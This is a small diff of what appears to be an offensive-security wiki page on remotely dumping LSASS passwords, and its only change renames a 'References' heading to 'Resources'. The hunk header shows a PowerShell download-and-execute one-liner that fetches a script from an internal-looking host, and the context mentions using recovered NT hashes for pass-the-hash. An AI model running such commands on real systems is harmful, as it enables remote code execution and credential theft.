@@ -105,6 +105,6 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5
 
 Recovered credential material could be either plaintext passwords or NT hash that can be used with [pass the hash](../../ntlm/pth.md) (depending on the context).
 
-## References
+## Resources
 
 {% embed url="https://en.hackndo.com/remote-lsass-dump-passwords/" %}
